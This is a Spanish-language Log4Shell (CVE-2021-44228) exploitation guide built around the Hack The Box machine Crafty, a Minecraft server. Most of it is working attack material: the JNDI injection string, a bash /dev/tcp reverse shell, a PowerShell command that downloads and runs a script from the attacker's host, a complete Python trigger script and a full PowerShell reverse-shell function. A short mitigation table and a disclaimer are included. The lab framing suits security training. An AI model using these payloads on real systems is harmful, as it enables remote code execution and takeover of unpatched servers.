** Explotación de Log4Shell (CVE-2021-44228) - Guía Completa **
---

## **📌 Descripción General**
**Log4Shell** es una vulnerabilidad crítica de **Ejecución Remota de Código (RCE)** descubierta en **diciembre de 2021** en la biblioteca de registro **Apache Log4j** (versiones **2.0 a 2.14.1**).
Esta falla permite a un atacante **inyectar código malicioso** mediante la sintaxis `${jndi:protocolo://servidor/recurso}`, lo que provoca que el servidor vulnerable **descargue y ejecute código arbitrario** mediante **JNDI (Java Naming and Directory Interface)** y protocolos como **LDAP**.

---

## **🔍 Resumen de la Vulnerabilidad**

### **📌 ¿Cómo funciona?**
1. **Procesamiento de logs**: Apache Log4j evalúa expresiones como `${jndi:ldap://atacante:1389/exploit}` en los mensajes de registro.
2. **Conexión a servidor externo**: El servidor vulnerable intenta resolver la consulta **JNDI**, conectándose a un servidor **LDAP/HTTP** controlado por el atacante.
3. **Descarga y ejecución**: El servidor **LDAP** redirige al atacante a un **servidor HTTP** donde se aloja un **payload malicioso** (`.class`).
4. **Ejecución en memoria**: El código se ejecuta directamente en la memoria del servidor vulnerable, permitiendo **RCE**.

### **🎯 Entorno de Ejemplo: HTB Crafty**
| **Parámetro**       | **Valor**                          |
|---------------------|------------------------------------|
| **Servicio**        | Servidor de Minecraft (1.16.5)     |
| **Puerto**          | 25565 (puerto por defecto)         |
| **Vector de Ataque**| Chat del juego (procesado por Log4j) |

---

## **🛠️ Metodología de Explotación**

### **🔹 Paso 1: Reconocimiento**
1. **Identificar versión vulnerable**:
   ```bash
   nmap -p 25565 <IP_VÍCTIMA>
   ```
   - Verificar si el servidor ejecuta **Java** y **Minecraft 1.16.5** (vulnerable).
2. **Conectarse al servidor**:
   - Usar un cliente como **Minecraft Console Client** para interactuar con el chat.

---

### **🔹 Paso 2: Preparación del Entorno**
1. **Instalar JDK (Java Development Kit)**:
   ```bash
   sudo apt install default-jdk
   ```
2. **Configurar servidor LDAP/HTTP**:
   - Usar herramientas como **[log4j-poc](https://github.com/kozmer/log4j-shell-poc)** para levantar un servidor **LDAP falso** (puerto `1389`) y un servidor **HTTP** (puerto `80`).
3. **Ajustar el payload**:
   - Para **Windows (Crafty)**, modificar el comando de ejecución a:
     ```powershell
     powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/reverse.ps1')"
     ```

---

### **🔹 Paso 3: Inyección del Payload**
1. **Enviar la cadena maliciosa** al chat de Minecraft:
   ```plaintext
   ${jndi:ldap://<IP_ATACANTE>:1389/exploit}
   ```
2. **Proceso de explotación**:
   - El servidor vulnerable **registra el mensaje** y procesa la sintaxis `${jndi:...}`.
   - Se conecta al servidor **LDAP** del atacante, que redirige a un **servidor HTTP** para descargar el payload.
   - El payload se ejecuta en memoria, iniciando una **reverse shell**.

---
## **🚀 Post-Explotación (Foothold)**
1. **Recibir la conexión inversa**:
   ```bash
   nc -nlvp 443
   ```
2. **Usuario obtenido**:
   ```plaintext
   svc_minecraft
   ```
3. **Enumeración local**:
   - Buscar archivos `.jar` o plugins (ej. `PlayerCounter.jar`) para extraer **credenciales hardcodeadas**.
   - Usar herramientas como **JD-GUI** o **FernFlower** para decompilar archivos `.jar`.

---
## **🛠️ Herramientas Utilizadas**
| **Herramienta**            | **Descripción**                                                                 |
|----------------------------|---------------------------------------------------------------------------------|
| **JDK**                    | Requerido para compilar y ejecutar scripts de explotación.                     |
| **log4j-poc**              | Scripts de prueba de concepto para automatizar el servidor LDAP.                |
| **Minecraft Console Client** | Cliente para interactuar con el chat del servidor desde Linux sin GUI.         |
| **Netcat**                 | Para recibir la conexión reversa (`nc -nlvp 443`).                            |
| **Nishang (Invoke-PowerShellTcp.ps1)** | Suite de scripts para obtener shells interactivos en Windows. |

---
## **🔒 Mitigación y Soluciones**
| **Medida**                 | **Descripción**                                                                 |
|----------------------------|---------------------------------------------------------------------------------|
| **Actualización**          | Migrar a **Log4j 2.17.1+** (parchea la vulnerabilidad).                        |
| **Configuración**          | Añadir en `log4j2.properties`:
   ```properties
   log4j2.formatMsgNoLookups=true
   ```
| **Eliminación manual**     | Eliminar la clase `JndiLookup` del classpath:
   ```bash
   rm -f /ruta/a/log4j-core-*.jar/org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```

---
## **📜 Estructura del Payload de Inyección**
### **🔹 Sintaxis Base**
```plaintext
${jndi:ldap://<IP_ATACANTE>:1389/exploit}
```
### **🔹 Funcionamiento Interno**
1. **Sintaxis JNDI**:
   - Log4j interpreta `${jndi:...}` y resuelve la consulta.
2. **Protocolo LDAP**:
   - El servidor vulnerable se conecta al **LDAP** del atacante (puerto `1389`).
3. **Servidor de Referencia**:
   - El servidor **LDAP** redirige al atacante a un **servidor HTTP** (puerto `80`) para descargar el payload.
4. **Ejecución en Memoria**:
   - El payload (`.class`) se ejecuta directamente en memoria sin dejar rastro en disco.

---
## **💻 Adaptación del Comando (Payload Interno)**
### **🔹 Para Linux**
```bash
/bin/sh -c "bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1"
```
### **🔹 Para Windows (Crafty)**
```powershell
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/reverse.ps1')"
```

---
## **📁 Archivos de Explotación**
### **1️⃣ Script de Activación en Python (`exploit_trigger.py`)**
```python
import socket
import argparse

def generate_jndi_payload(attacker_ip, ldap_port):
    return f"${{jndi:ldap://{attacker_ip}:{ldap_port}/exploit}}"

def send_payload(target_ip, target_port, payload):
    print(f"[*] Enviando payload: {payload}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(payload.encode('utf-8') + b'\n')
            print("[+] Payload enviado correctamente.")
    except Exception as e:
        print(f"[!] Error al conectar: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger para Log4Shell")
    parser.add_argument("-t", "--target", required=True, help="IP de la máquina víctima")
    parser.add_argument("-p", "--port", type=int, default=25565, help="Puerto del servicio (ej. 25565 para Minecraft)")
    parser.add_argument("-l", "--lhost", required=True, help="IP del atacante")
    parser.add_argument("-lp", "--lport", type=int, default=1389, help="Puerto del servidor LDAP malicioso")

    args = parser.parse_args()
    payload = generate_jndi_payload(args.lhost, args.lport)
    send_payload(args.target, args.port, payload)
```
**📌 Uso:**
```bash
python3 exploit_trigger.py -t <IP_VÍCTIMA> -p 25565 -l <IP_ATACANTE> -lp 1389
```

---
### **2️⃣ Script de Reverse Shell en PowerShell (`reverse.ps1`)**
```powershell
function Invoke-PowerShellTcp {
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(ParameterSetName="reverse", Mandatory=$true)]
        [String]$IPAddress,
        [Parameter(ParameterSetName="reverse", Mandatory=$true)]
        [Int]$Port
    )

    Process {
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $x = ($byte = [text.encoding]::ASCII.GetBytes($sendback2))
            $stream.Write($byte,0,$byte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
}

# Llamada autoejecutable (ajusta con tu IP y puerto de netcat)
Invoke-PowerShellTcp -Reverse -IPAddress <TU_IP_ATACANTE> -Port 443
```
**📌 Uso:**
1. Alojar el script en un servidor HTTP:
   ```bash
   python3 -m http.server 80
   ```
2. Configurar el payload en el servidor LDAP para que ejecute:
   ```powershell
   powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/reverse.ps1')"
   ```
3. Iniciar el listener de netcat:
   ```bash
   nc -nlvp 443
   ```

---
## **🚀 Metodología de Uso para la Explotación**
1. **Preparar el payload**:
   - Configurar el servidor **LDAP/HTTP** para que el payload ejecute PowerShell en Windows.
2. **Alojar el script `reverse.ps1`**:
   ```bash
   python3 -m http.server 80
   ```
3. **Iniciar el listener de netcat**:
   ```bash
   nc -nlvp 443
   ```
4. **Ejecutar el exploit**:
   ```bash
   python3 exploit_trigger.py -t <IP_VÍCTIMA> -p 25565 -l <IP_ATACANTE> -lp 1389
   ```
5. **Obtener acceso**:
   - Recibir la conexión inversa en `nc` y enumerar el sistema.

---
## **⚠️ Advertencias y Buenas Prácticas**
✅ **Solo para fines educativos y de investigación**.
✅ **No atacar sistemas sin autorización** (ilegal en la mayoría de jurisdicciones).
✅ **Usar en entornos controlados** (como máquinas de Hack The Box).
✅ **Actualizar siempre los sistemas** para evitar vulnerabilidades conocidas.

---
## **📚 Fuentes y Referencias**
- [CVE-2021-44228 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisories](https://logging.apache.org/log4j/2.x/security.html)
- [log4j-shell-poc (GitHub)](https://github.com/kozmer/log4j-shell-poc)
- [Nishang (PowerShell Exploits)](https://github.com/samratashok/nishang)

---
**📌 Nota Final**:
Esta guía es **exclusivamente para fines educativos**. El uso indebido de esta información puede tener **consecuencias legales**. Siempre obtén **autorización explícita** antes de realizar pruebas de penetración.
